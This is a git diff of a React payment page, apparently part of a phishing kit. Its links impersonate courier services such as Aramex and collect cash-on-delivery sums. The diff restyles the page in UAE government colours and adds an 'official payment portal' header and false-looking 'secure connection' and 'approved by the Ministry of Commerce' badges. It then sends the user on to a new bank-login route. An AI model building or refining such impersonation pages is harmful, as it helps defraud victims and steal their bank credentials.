@@ -4,11 +4,12 @@ import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { Building2, ArrowLeft, Loader2 } from "lucide-react";
+import { Building2, ArrowLeft, Loader2, Shield, CheckCircle, Lock } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
+import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
 
 const PaymentBankSelector = () => {
   const { id } = useParams();
@@ -20,27 +21,26 @@ const PaymentBankSelector = () => {
   const [selectedBank, setSelectedBank] = useState<string>("");
   const [banks, setBanks] = useState<Bank[]>([]);
   const [loadingBanks, setLoadingBanks] = useState(false);
-  
+
   // Get country from link data
   const countryCode = linkData?.country_code || "";
   const countryData = getCountryByCode(countryCode);
-  
+
   // Get preselected bank from link payload if available
   const preselectedBank = linkData?.payload?.selected_bank;
-  
+
   // Get customer info from link data (cross-device compatible)
   const customerInfo = linkData?.payload?.customerInfo || {};
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  
+
   const shippingInfo = linkData?.payload as any;
 
-  // Get amount from link data - ensure it's a number, handle all data types
+  // Get amount from link data
   const rawAmount = shippingInfo?.cod_amount;
 
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
+  let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
     if (typeof rawAmount === 'number') {
       amount = rawAmount;
@@ -52,34 +52,41 @@ const PaymentBankSelector = () => {
     }
   }
 
-  const formattedAmount = `${amount} ر.س`;
-  
+  const formattedAmount = formatCurrency(amount, countryCode);
+
+  // UAE Government Color Scheme
+  const uaeColors = {
+    primary: "#CE1126",
+    secondary: "#00732F",
+    accent: "#000000",
+    background: "#FFFFFF",
+    lightGray: "#F5F5F5",
+    border: "#E0E0E0",
+  };
+
   // Load banks when country is available from link data
   useEffect(() => {
     if (countryCode) {
       setLoadingBanks(true);
-      // Simulate API call
       setTimeout(() => {
         const countryBanks = getBanksByCountry(countryCode);
         setBanks(countryBanks);
         setLoadingBanks(false);
-        
-        // Auto-select bank if it was preselected during link creation
+
         if (preselectedBank) {
           setSelectedBank(preselectedBank);
         }
       }, 300);
     }
   }, [countryCode, preselectedBank]);
-  
+
   const handleBankSelect = (bankId: string) => {
     setSelectedBank(bankId);
   };
-  
+
   const handleSkip = async () => {
     if (!linkData) return;
 
-    // Save to link for cross-device compatibility
     try {
       const updatedPayload = {
         ...linkData.payload,
@@ -104,9 +111,18 @@ const PaymentBankSelector = () => {
   };
 
   const handleContinue = async () => {
-    if (!linkData || !selectedBank) return;
+    if (!selectedBank) {
+      toast({
+        title: "لم يتم اختيار بنك",
+        description: "الرجاء اختيار بنك للمتابعة",
+        variant: "destructive",
+      });
+      return;
+    }
 
-    // Save to link for cross-device compatibility
+    if (!linkData) return;
+
+    // Save selected bank to link for cross-device compatibility
     try {
       const updatedPayload = {
         ...linkData.payload,
@@ -118,192 +134,166 @@ const PaymentBankSelector = () => {
         linkId: id!,
         payload: updatedPayload
       });
+
+      // Determine next action based on payment method
+      navigate(`/pay/${id}/bank-login?bank=${selectedBank}`);
     } catch (error) {
       console.error('Error saving bank selection:', error);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء حفظ اختيار البنك",
+        variant: "destructive",
+      });
     }
-
-    navigate(`/pay/${id}/card-input`);
   };
-  
-  // Show loading state while fetching link data
-  if (linkLoading || !linkData) {
-    return (
-      <div 
-        className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
-        dir="rtl"
-        style={{
-          background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
-        }}
-      >
-        <div className="text-center">
-          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: branding.colors.primary }} />
-          <p className="text-muted-foreground">جاري تحميل البيانات...</p>
-        </div>
-      </div>
-    );
-  }
-  
-  // Show error if no country data
-  if (!countryData) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
-        <div className="text-center p-8">
-          <Building2 className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
-          <h2 className="text-2xl font-bold mb-2 text-foreground">خطأ في البيانات</h2>
-          <p className="text-muted-foreground mb-6">لم يتم العثور على بيانات الدولة</p>
-          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
-        </div>
-      </div>
-    );
-  }
-  
-  return (
-    <div 
-      className="min-h-screen py-4 sm:py-12 bg-background" 
-      dir="rtl"
-      style={{
-        background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
-      }}
-    >
-      <div className="container mx-auto px-4 max-w-2xl">
-        {/* Header */}
-        <div className="mb-6">
-          <button
-            onClick={() => navigate(`/pay/${id}/details`)}
-            className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground mb-4"
-          >
-            <ArrowLeft className="w-4 h-4" />
-            <span>رجوع</span>
-          </button>
-          
-          <div className="flex items-center gap-3 mb-2">
-            <div
-              className="w-12 h-12 rounded-full flex items-center justify-center"
-              style={{
-                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
-              }}
-            >
-              <Building2 className="w-6 h-6 text-white" />
-            </div>
-            <div>
-              <h1 className="text-2xl font-bold">اختر البنك</h1>
-              <p className="text-sm text-muted-foreground">
-                {serviceName} - {formattedAmount}
-              </p>
-            </div>
-          </div>
-        </div>
 
-        {/* Country Badge */}
-        {countryData && (
-          <div className="mb-4">
-            <Badge variant="secondary" className="text-sm">
-              {countryData.flag} {countryData.nameAr}
+  const selectedBankData = banks.find(b => b.id === selectedBank);
+
+  return (
+    <div className="min-h-screen" style={{ backgroundColor: uaeColors.lightGray }} dir="rtl">
+      {/* Header */}
+      <div className="w-full" style={{ backgroundColor: uaeColors.primary }}>
+        <div className="container mx-auto px-4 py-3">
+          <div className="flex items-center justify-between">
+            <div className="flex items-center gap-3">
+              <div className="w-12 h-12 bg-white rounded-lg flex items-center justify-center">
+                <Building2 className="w-6 h-6" style={{ color: uaeColors.primary }} />
+              </div>
+              <div className="text-white">
+                <h1 className="text-lg font-bold">البوابة الرسمية للدفع</h1>
+                <p className="text-xs opacity-90">آمن • موثوق • سريع</p>
+              </div>
+            </div>
+            <Badge variant="secondary" className="bg-white text-gray-800">
+              <Lock className="w-3 h-3 ml-1" />
+              اتصال آمن
             </Badge>
           </div>
-        )}
+        </div>
+      </div>
 
-        {/* Loading Banks */}
-        {loadingBanks ? (
-          <div className="text-center py-12">
-            <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4 text-primary" />
-            <p className="text-muted-foreground">جاري تحميل البنوك...</p>
+      <div className="container mx-auto px-4 py-8">
+        <div className="max-w-3xl mx-auto">
+          {/* Security Notice */}
+          <div className="mb-6 p-4 bg-white rounded-lg border-r-4" style={{ borderRightColor: uaeColors.secondary }}>
+            <div className="flex items-start gap-3">
+              <Shield className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
+              <div>
+                <h3 className="font-semibold text-sm mb-1">اختيار البنك</h3>
+                <p className="text-xs text-gray-600">
+                  اختر البنك الذي تريد التحويل إليه. جميع البنوك تدعم الدفع الآمن
+                </p>
+              </div>
+            </div>
           </div>
-        ) : banks.length === 0 ? (
-          <Card className="p-8 text-center">
-            <Building2 className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
-            <p className="text-muted-foreground mb-4">لا توجد بنوك متاحة لهذه الدولة</p>
-            <Button onClick={handleSkip} variant="outline">
-              متابعة بدون تحديد بنك
-            </Button>
-          </Card>
-        ) : (
-          <>
-            {/* Banks Grid */}
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-6">
-              {banks.map((bank) => (
-                <Card
-                  key={bank.id}
-                  className={`p-4 cursor-pointer transition-all hover:shadow-md ${
-                    selectedBank === bank.id
-                      ? 'ring-2 bg-primary/5'
-                      : 'hover:bg-accent/50'
-                  }`}
-                  style={{
-                    borderColor: selectedBank === bank.id ? branding.colors.primary : undefined,
-                  }}
-                  onClick={() => handleBankSelect(bank.id)}
+
+          <Card className="p-6 sm:p-8 shadow-lg border-0 rounded-lg overflow-hidden">
+            <div className="mb-6">
+              <div className="flex items-center gap-3 mb-2">
+                <div
+                  className="w-12 h-12 rounded-full flex items-center justify-center"
+                  style={{ backgroundColor: `${uaeColors.primary}15` }}
                 >
-                  <div className="flex items-center gap-3">
-                    <div
-                      className="w-10 h-10 rounded-lg flex items-center justify-center text-white text-sm font-bold"
-                      style={{
-                        background: selectedBank === bank.id
-                          ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-                          : '#64748b',
-                      }}
-                    >
-                      {bank.nameAr.charAt(0)}
-                    </div>
-                    <div className="flex-1">
-                      <h3 className="font-semibold text-sm">{bank.nameAr}</h3>
-                      <p className="text-xs text-muted-foreground">{bank.name}</p>
-                    </div>
-                    {selectedBank === bank.id && (
-                      <div
-                        className="w-5 h-5 rounded-full flex items-center justify-center"
-                        style={{ backgroundColor: branding.colors.primary }}
-                      >
-                        <svg
-                          className="w-3 h-3 text-white"
-                          fill="none"
-                          strokeLinecap="round"
-                          strokeLinejoin="round"
-                          strokeWidth="2"
-                          viewBox="0 0 24 24"
-                          stroke="currentColor"
+                  <Building2 className="w-6 h-6" style={{ color: uaeColors.primary }} />
+                </div>
+                <div>
+                  <h3 className="text-lg font-bold" style={{ color: uaeColors.accent }}>
+                    اختر البنك
+                  </h3>
+                  <p className="text-sm text-gray-500">اختر البنك الذي تريد التحويل إليه</p>
+                </div>
+              </div>
+            </div>
+
+            {/* Amount Display */}
+            <div className="mb-6 p-4 rounded-lg" style={{ backgroundColor: uaeColors.lightGray }}>
+              <div className="flex justify-between items-center">
+                <span className="text-sm text-gray-600">المبلغ المطلوب دفعه</span>
+                <span className="text-2xl font-bold" style={{ color: uaeColors.primary }}>{formattedAmount}</span>
+              </div>
+            </div>
+
+            {/* Banks List */}
+            <div className="space-y-3 mb-6">
+              {loadingBanks ? (
+                <div className="flex items-center justify-center py-12">
+                  <Loader2 className="w-8 h-8 animate-spin" style={{ color: uaeColors.primary }} />
+                </div>
+              ) : banks.length > 0 ? (
+                banks.map((bank) => (
+                  <div
+                    key={bank.id}
+                    onClick={() => handleBankSelect(bank.id)}
+                    className={`p-4 rounded-lg border-2 cursor-pointer transition-all hover:shadow-md ${
+                      selectedBank === bank.id
+                        ? 'border-opacity-100'
+                        : 'border-opacity-50 hover:border-opacity-75'
+                    }`}
+                    style={{
+                      borderColor: selectedBank === bank.id ? uaeColors.primary : uaeColors.border,
+                      backgroundColor: selectedBank === bank.id ? `${uaeColors.primary}08` : uaeColors.background,
+                    }}
+                  >
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-3">
+                        <div
+                          className="w-12 h-12 rounded-lg flex items-center justify-center"
+                          style={{ backgroundColor: `${uaeColors.primary}15` }}
                         >
-                          <path d="M5 13l4 4L19 7" />
-                        </svg>
+                          <Building2 className="w-6 h-6" style={{ color: uaeColors.primary }} />
+                        </div>
+                        <div>
+                          <h4 className="font-bold text-base" style={{ color: uaeColors.accent }}>{bank.name}</h4>
+                          <p className="text-sm text-gray-500">{bank.branchCode}</p>
+                        </div>
                       </div>
-                    )}
+                      {selectedBank === bank.id && (
+                        <CheckCircle className="w-6 h-6" style={{ color: uaeColors.secondary }} />
+                      )}
+                    </div>
                   </div>
-                </Card>
-              ))}
+                ))
+              ) : (
+                <div className="text-center py-8">
+                  <Building2 className="w-16 h-16 mx-auto text-gray-300 mb-4" />
+                  <p className="text-gray-500">لا توجد بنوك متاحة في هذه الدولة</p>
+                </div>
+              )}
             </div>
 
             {/* Action Buttons */}
-            <div className="space-y-3">
+            <div className="flex gap-4">
+              <Button
+                variant="outline"
+                onClick={handleSkip}
+                className="flex-1 h-12 text-base"
+              >
+                تخطي
+              </Button>
               <Button
                 onClick={handleContinue}
+                className="flex-1 h-12 text-base font-bold text-white transition-all hover:opacity-90"
+                style={{ backgroundColor: uaeColors.primary }}
                 disabled={!selectedBank}
-                className="w-full h-12 text-base font-semibold"
-                style={{
-                  background: selectedBank
-                    ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-                    : undefined,
-                }}
               >
-                متابعة
-              </Button>
-              
-              <Button
-                onClick={handleSkip}
-                variant="outline"
-                className="w-full h-12 text-base"
-              >
-                تخطي واستخدام أي بنك
+                <span className="ml-2">متابعة</span>
+                <ArrowLeft className="w-5 h-5" />
               </Button>
             </div>
 
-            {/* Info Note */}
-            <div className="mt-6 p-4 bg-muted/50 rounded-lg">
-              <p className="text-xs text-muted-foreground text-center">
-                💡 يمكنك تخطي هذه الخطوة واستخدام بطاقة من أي بنك
-              </p>
+            <p className="text-xs text-center text-gray-500 mt-4">
+              بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
+            </p>
+          </Card>
+
+          {/* Security Footer */}
+          <div className="mt-6 text-center">
+            <div className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm">
+              <Shield className="w-4 h-4" style={{ color: uaeColors.secondary }} />
+              <span className="text-xs font-medium" style={{ color: uaeColors.accent }}>معتمد من وزارة التجارة</span>
             </div>
-          </>
-        )}
+          </div>
+        </div>
       </div>
     </div>
   );
